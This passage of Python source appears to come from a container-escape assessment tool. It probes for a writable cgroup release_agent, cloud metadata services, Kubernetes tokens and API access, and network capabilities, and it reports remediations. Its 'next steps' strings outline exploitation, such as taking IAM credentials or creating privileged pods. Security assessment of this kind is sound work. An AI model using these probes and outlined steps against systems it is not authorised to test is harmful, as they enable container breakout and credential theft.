            if os.access(path, os.W_OK):
                writable_agents.append(path)

        if writable_agents:
            return EscapeAttemptResult(
                method=EscapeMethod.CGROUP_RELEASE_AGENT,
                status=EscapeStatus.VULNERABLE,
                message=f"Writable release_agent found: {', '.join(writable_agents)}",
                severity=SeverityLevel.CRITICAL,
                cve_id="CVE-2022-0492",
                mitre_techniques=["T1611", "T1059"],
                demo_next_steps="Write payload to release_agent, trigger cgroup cleanup",
                remediation="Use cgroup v2, restrict CAP_SYS_ADMIN"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.CGROUP_RELEASE_AGENT,
            status=EscapeStatus.NOT_VULNERABLE,
            message="No writable cgroup release_agent found",
            severity=SeverityLevel.INFO
        )

    async def _try_proc_kcore(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check access to /proc/kcore."""
        path = '/proc/kcore'

        if not os.path.exists(path):
            return EscapeAttemptResult(
                method=EscapeMethod.PROC_KCORE,
                status=EscapeStatus.NOT_FOUND,
                message="/proc/kcore not found",
                severity=SeverityLevel.INFO
            )

        if os.access(path, os.R_OK):
            return EscapeAttemptResult(
                method=EscapeMethod.PROC_KCORE,
                status=EscapeStatus.VULNERABLE,
                message="/proc/kcore accessible - kernel memory readable",
                severity=SeverityLevel.CRITICAL,
                mitre_techniques=["T1003", "T1068"],
                demo_next_steps="Can extract kernel memory, credentials",
                remediation="Mask /proc/kcore in container"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.PROC_KCORE,
            status=EscapeStatus.NOT_VULNERABLE,
            message="/proc/kcore not accessible",
            severity=SeverityLevel.INFO
        )

    def _cvss_to_severity( cvss: float) -> SeverityLevel:
        """Convert CVSS score to severity level."""
        if cvss >= 9.0:
            return SeverityLevel.CRITICAL
        elif cvss >= 7.0:
            return SeverityLevel.HIGH
        elif cvss >= 4.0:
            return SeverityLevel.MEDIUM
        elif cvss > 0:
            return SeverityLevel.LOW
        return SeverityLevel.INFO

    async def _test_cloud_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test cloud-specific escape vectors."""
        coros = [
            self._try_cloud_metadata(env, options),
            self._try_k8s_service_account(env, options),
        ]
        if env.kubernetes.in_kubernetes:
            coros.append(self._try_k8s_api(env, options))
        return await self._gather_with_semaphore(coros)

    async def _try_cloud_metadata(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to access cloud metadata service."""
        metadata_ip = "169.254.169.254"

        # Quick connectivity check
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((metadata_ip, 80))
            sock.close()

            if result != 0:
                return EscapeAttemptResult(
                    method=EscapeMethod.IMDS_ACCESS,
                    status=EscapeStatus.NOT_FOUND,
                    message="Cloud metadata service not reachable",
                    severity=SeverityLevel.INFO
                )
        except:
            return EscapeAttemptResult(
                method=EscapeMethod.IMDS_ACCESS,
                status=EscapeStatus.NOT_FOUND,
                message="Cloud metadata service not reachable",
                severity=SeverityLevel.INFO
            )

        # Try to access metadata
        try:
            import httpx
            async with httpx.AsyncClient(timeout=3.0) as client:
                # Try AWS
                try:
                    resp = await client.get(f"http://{metadata_ip}/latest/meta-data/")
                    if resp.status_code == 200:
                        return EscapeAttemptResult(
                            method=EscapeMethod.AWS_IMDS,
                            status=EscapeStatus.VULNERABLE,
                            message="AWS metadata service accessible - potential credential theft",
                            severity=SeverityLevel.HIGH,
                            mitre_techniques=["T1552", "T1078"],
                            demo_next_steps="Query /latest/meta-data/iam/security-credentials/ for IAM creds",
                            remediation="Block 169.254.169.254, use IMDSv2 with hop limit 1"
                        )
                except:
                    pass

                # Try GCP
                try:
                    resp = await client.get(
                        f"http://metadata.google.internal/computeMetadata/v1/",
                        headers={"Metadata-Flavor": "Google"}
                    )
                    if resp.status_code == 200:
                        return EscapeAttemptResult(
                            method=EscapeMethod.GCP_METADATA,
                            status=EscapeStatus.VULNERABLE,
                            message="GCP metadata service accessible",
                            severity=SeverityLevel.HIGH,
                            mitre_techniques=["T1552", "T1078"],
                            demo_next_steps="Query for service account tokens",
                            remediation="Use Workload Identity, block metadata access"
                        )
                except:
                    pass

                # Try Azure
                try:
                    resp = await client.get(
                        f"http://{metadata_ip}/metadata/instance",
                        headers={"Metadata": "true"}
                    )
                    if resp.status_code == 200:
                        return EscapeAttemptResult(
                            method=EscapeMethod.AZURE_IMDS,
                            status=EscapeStatus.VULNERABLE,
                            message="Azure metadata service accessible",
                            severity=SeverityLevel.HIGH,
                            mitre_techniques=["T1552", "T1078"],
                            remediation="Use managed identity restrictions"
                        )
                except:
                    pass
        except ImportError:
            # Fallback to curl
            try:
                rc, out, _ = await run_exec(
                    ['curl', '-s', '-m', '2', f'http://{metadata_ip}/latest/meta-data/'],
                    timeout=5,
                )
                if rc == 0 and (out or "").strip():
                    return EscapeAttemptResult(
                        method=EscapeMethod.IMDS_ACCESS,
                        status=EscapeStatus.VULNERABLE,
                        message="Cloud metadata service accessible (detected via curl)",
                        severity=SeverityLevel.HIGH,
                        mitre_techniques=["T1552", "T1078"],
                        remediation="Block 169.254.169.254"
                    )
            except:
                pass

        return EscapeAttemptResult(
            method=EscapeMethod.IMDS_ACCESS,
            status=EscapeStatus.NOT_VULNERABLE,
            message="Cloud metadata service not accessible or blocked",
            severity=SeverityLevel.INFO
        )

    async def _try_k8s_service_account(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check Kubernetes service account access."""
        token_path = K8S_PATHS["token"]

        if not os.path.exists(token_path):
            return EscapeAttemptResult(
                method=EscapeMethod.K8S_SERVICE_ACCOUNT,
                status=EscapeStatus.NOT_FOUND,
                message="Kubernetes service account token not found",
                severity=SeverityLevel.INFO
            )

        try:
            with open(token_path, 'r') as f:
                token = f.read()[:100]

            return EscapeAttemptResult(
                method=EscapeMethod.K8S_SERVICE_ACCOUNT,
                status=EscapeStatus.VULNERABLE,
                message="Kubernetes service account token accessible",
                severity=SeverityLevel.HIGH,
                artifact_content=f"Token prefix: {token}..." if options.collect_artifacts else None,
                mitre_techniques=["T1552", "T1078"],
                demo_next_steps="Use token to authenticate to Kubernetes API",
                remediation="Set automountServiceAccountToken: false, use RBAC"
            )
        except:
            return EscapeAttemptResult(
                method=EscapeMethod.K8S_SERVICE_ACCOUNT,
                status=EscapeStatus.NOT_CAPABLE,
                message="Cannot read Kubernetes service account token",
                severity=SeverityLevel.INFO
            )

    async def _try_k8s_api(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Try to access Kubernetes API."""
        if not env.kubernetes.has_token or not env.kubernetes.api_server:
            return EscapeAttemptResult(
                method=EscapeMethod.K8S_API_ACCESS,
                status=EscapeStatus.NOT_CAPABLE,
                message="Kubernetes API access requirements not met",
                severity=SeverityLevel.INFO
            )

        try:
            import httpx

            with open(K8S_PATHS["token"], 'r') as f:
                token = f.read().strip()

            async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                resp = await client.get(
                    f"{env.kubernetes.api_server}/api/v1/namespaces",
                    headers={"Authorization": f"Bearer {token}"}
                )

                if resp.status_code == 200:
                    return EscapeAttemptResult(
                        method=EscapeMethod.K8S_API_ACCESS,
                        status=EscapeStatus.VULNERABLE,
                        message="Kubernetes API accessible - can list namespaces",
                        severity=SeverityLevel.CRITICAL,
                        mitre_techniques=["T1552", "T1078", "T1613"],
                        demo_next_steps="Enumerate permissions, access secrets, create privileged pods",
                        remediation="Apply strict RBAC policies"
                    )
                elif resp.status_code == 403:
                    return EscapeAttemptResult(
                        method=EscapeMethod.K8S_API_ACCESS,
                        status=EscapeStatus.POSSIBLE,
                        message="Kubernetes API reachable but limited permissions",
                        severity=SeverityLevel.MEDIUM
                    )
        except:
            pass

        return EscapeAttemptResult(
            method=EscapeMethod.K8S_API_ACCESS,
            status=EscapeStatus.NOT_VULNERABLE,
            message="Cannot access Kubernetes API",
            severity=SeverityLevel.INFO
        )

    async def _test_network_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test network-based escape vectors."""
        coros = [
            self._try_arp_spoofing(env, options),
            self._try_iptables(env, options),
            self._try_tiocsti(env, options),
        ]
        return await self._gather_with_semaphore(coros)

    async def _try_arp_spoofing(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check ARP spoofing capability."""
        if "CAP_NET_RAW" not in env.effective_caps and "CAP_NET_ADMIN" not in env.effective_caps:
            return EscapeAttemptResult(
                method=EscapeMethod.ARP_SPOOFING,
                status=EscapeStatus.NOT_CAPABLE,
                message="CAP_NET_RAW/CAP_NET_ADMIN not available for ARP spoofing",
                severity=SeverityLevel.INFO
            )

        import shutil
        tools = []
        for tool in ['arpspoof', 'ettercap', 'bettercap', 'arping']:
            if shutil.which(tool):
                tools.append(tool)

        return EscapeAttemptResult(
            method=EscapeMethod.ARP_SPOOFING,
            status=EscapeStatus.VULNERABLE,
            message=f"ARP spoofing possible with CAP_NET_RAW (tools: {', '.join(tools) if tools else 'raw sockets'})",
            severity=SeverityLevel.HIGH,
            mitre_techniques=["T1557", "T1040"],
            demo_next_steps="Can perform MITM attacks on container network",
            remediation="Drop CAP_NET_RAW, use network policies"
        )

    async def _try_iptables(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check iptables access."""
        import shutil

        if not shutil.which('iptables'):
            return EscapeAttemptResult(
                method=EscapeMethod.IPTABLES_ACCESS,
                status=EscapeStatus.NOT_FOUND,
                message="iptables not available",
                severity=SeverityLevel.INFO
            )

        try:
            rc, out, _ = await run_exec(['iptables', '-L'], timeout=5)

            if rc == 0:
                return EscapeAttemptResult(
                    method=EscapeMethod.IPTABLES_ACCESS,
                    status=EscapeStatus.VULNERABLE,
                    message="iptables accessible - can modify firewall rules",
                    severity=SeverityLevel.HIGH,
                    artifact_content=(out or "")[:500] if options.collect_artifacts else None,
                    mitre_techniques=["T1562", "T1557"],
                    demo_next_steps="Can intercept traffic, bypass network policies",
                    remediation="Drop CAP_NET_ADMIN, use seccomp"
                )
        except:
            pass

        return EscapeAttemptResult(
            method=EscapeMethod.IPTABLES_ACCESS,
            status=EscapeStatus.NOT_VULNERABLE,
            message="iptables not accessible",
            severity=SeverityLevel.INFO
        )

    async def _try_tiocsti(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> EscapeAttemptResult:
        """Check TIOCSTI ioctl injection capability."""
        # TIOCSTI is usually blocked by default seccomp profile
        if env.seccomp_profile == "disabled":
            return EscapeAttemptResult(
                method=EscapeMethod.TIOCSTI_INJECTION,
                status=EscapeStatus.VULNERABLE,
                message="Seccomp disabled - TIOCSTI TTY injection may be possible",
                severity=SeverityLevel.MEDIUM,
                mitre_techniques=["T1055"],
                demo_next_steps="Can inject keystrokes into TTY",
                remediation="Enable seccomp profile"
            )

        return EscapeAttemptResult(
            method=EscapeMethod.TIOCSTI_INJECTION,
            status=EscapeStatus.BLOCKED,
            message="TIOCSTI likely blocked by seccomp",
            severity=SeverityLevel.INFO
        )

    async def _test_security_policies(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Check security policy status."""
        results = []

        # SELinux
        if env.selinux_enforcing is not None:
            if not env.selinux_enforcing:
                results.append(EscapeAttemptResult(
                    method=EscapeMethod.SELINUX_DISABLED,
                    status=EscapeStatus.VULNERABLE,
                    message="SELinux is disabled or permissive",
                    severity=SeverityLevel.MEDIUM,
                    remediation="Enable SELinux enforcing mode"
                ))
            else:
                results.append(EscapeAttemptResult(
                    method=EscapeMethod.SELINUX_DISABLED,
                    status=EscapeStatus.NOT_VULNERABLE,
                    message="SELinux is enforcing",
                    severity=SeverityLevel.INFO
                ))

        # AppArmor
        if not env.apparmor_profile or env.apparmor_profile == 'unconfined':
            results.append(EscapeAttemptResult(
                method=EscapeMethod.APPARMOR_DISABLED,
                status=EscapeStatus.VULNERABLE,
                message="AppArmor not enforcing or unconfined",
                severity=SeverityLevel.MEDIUM,
                remediation="Apply AppArmor profile to container"
            ))
        else:
            results.append(EscapeAttemptResult(
                method=EscapeMethod.APPARMOR_DISABLED,
                status=EscapeStatus.NOT_VULNERABLE,
                message=f"AppArmor profile active: {env.apparmor_profile}",
                severity=SeverityLevel.INFO
            ))

        # Seccomp
        if not env.seccomp_profile or env.seccomp_profile == 'disabled':
            results.append(EscapeAttemptResult(
                method=EscapeMethod.SECCOMP_DISABLED,
                status=EscapeStatus.VULNERABLE,
                message="Seccomp not enabled",
                severity=SeverityLevel.MEDIUM,
                remediation="Enable seccomp profile"
            ))
        else:
            results.append(EscapeAttemptResult(
                method=EscapeMethod.SECCOMP_DISABLED,
                status=EscapeStatus.NOT_VULNERABLE,
                message=f"Seccomp mode: {env.seccomp_profile}",
                severity=SeverityLevel.INFO
            ))

        # No new privileges
        if not env.no_new_privs:
            results.append(EscapeAttemptResult(
                method=EscapeMethod.NO_NEW_PRIVS_DISABLED,
                status=EscapeStatus.VULNERABLE,
                message="no_new_privs not set",
                severity=SeverityLevel.LOW,
                remediation="Set security-opt no-new-privileges:true"
            ))

        # Read-only root filesystem
        if not env.read_only_rootfs:
            results.append(EscapeAttemptResult(
                method=EscapeMethod.READ_ONLY_ROOTFS_DISABLED,
                status=EscapeStatus.POSSIBLE,
                message="Root filesystem is writable",
                severity=SeverityLevel.LOW,
                remediation="Use --read-only flag"
            ))

        return results

    async def _test_alternative_runtime_escapes(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Test escape vectors for alternative container runtimes."""
        results = []
        
        for runtime_name, runtime_data in ALTERNATIVE_RUNTIME_ESCAPES.items():
            # Check if this runtime is in use
            detection_indicators = runtime_data.get("detection_indicators", [])
            
            runtime_detected = False
            for indicator in detection_indicators:
                if os.path.exists(indicator) or glob.glob(indicator):
                    runtime_detected = True
                    break
            
            if not runtime_detected:
                continue
            
            # Test escape methods for this runtime
            escape_methods = runtime_data.get("escape_methods", [])
            for escape_info in escape_methods:
                method_name = escape_info.get("name", "unknown")
                check_path = escape_info.get("check_path", "")
                severity = escape_info.get("severity", "medium")
                
                # Check if escape path exists
                is_vulnerable = False
                if check_path:
                    if os.path.exists(check_path):
                        is_vulnerable = True
                    elif "*" in check_path and glob.glob(check_path):
                        is_vulnerable = True
                
                if is_vulnerable:
                    results.append(EscapeAttemptResult(
                        method=EscapeMethod.ALTERNATIVE_RUNTIME,
                        status=EscapeStatus.VULNERABLE,
                        message=f"{runtime_name}: {method_name} escape possible",
                        severity=SeverityLevel.HIGH if severity == "critical" else SeverityLevel.MEDIUM,
                        mitre_techniques=escape_info.get("mitre_techniques", ["T1611"]),
                        demo_next_steps=escape_info.get("exploitation", ""),
                        remediation=escape_info.get("remediation", "Review runtime configuration")
                    ))
                else:
                    results.append(EscapeAttemptResult(
                        method=EscapeMethod.ALTERNATIVE_RUNTIME,
                        status=EscapeStatus.NOT_VULNERABLE,
                        message=f"{runtime_name}: {method_name} not exploitable",
                        severity=SeverityLevel.INFO
                    ))
        
        return results

    async def _test_namespace_escape_catalog(
        self,
        env: ContainerEnvironment,
        options: EscapeOptions
    ) -> List[EscapeAttemptResult]:
        """Catalog-based namespace escape techniques (non-invasive)."""
        results = []
        
        for ns_type, ns_data in NAMESPACE_ESCAPES.items():
            description = ns_data.get("description", "")
            escape_methods = ns_data.get("escape_methods", [])
            
            for escape_info in escape_methods:
                method_name = escape_info.get("name", "unknown")
                requires = escape_info.get("requires", [])
                
                # Check requirements
                requirements_met = True
                for req in requires:
                    if req.startswith("CAP_"):
                        if req not in env.capabilities:
                            requirements_met = False
                            break
                    elif req == "privileged":
                        if not env.is_privileged:
                            requirements_met = False
                            break
                    elif req == "hostPID":
                        if not env.host_pid:
                            requirements_met = False
                            break
                    elif req == "hostNetwork":
                        if not env.host_network:
                            requirements_met = False
                            break
                
                if requirements_met and requires:
                    severity = SeverityLevel.HIGH if escape_info.get("severity") == "critical" else SeverityLevel.MEDIUM
                    
                    results.append(EscapeAttemptResult(
                        method=EscapeMethod.NAMESPACE_ESCAPE,
                        status=EscapeStatus.VULNERABLE,
                        message=f"{ns_type} namespace escape: {method_name}",
                        severity=severity,
                        mitre_techniques=escape_info.get("mitre_techniques", ["T1611"]),
                        demo_next_steps=escape_info.get("exploitation", ""),
                        remediation=escape_info.get("remediation", "Restrict namespace access")
                    ))
                elif requires:
                    results.append(EscapeAttemptResult(
                        method=EscapeMethod.NAMESPACE_ESCAPE,
                        status=EscapeStatus.NOT_CAPABLE,
                        message=f"{ns_type} namespace escape: {method_name} - requirements not met",
                        severity=SeverityLevel.INFO
                    ))
        
        return results
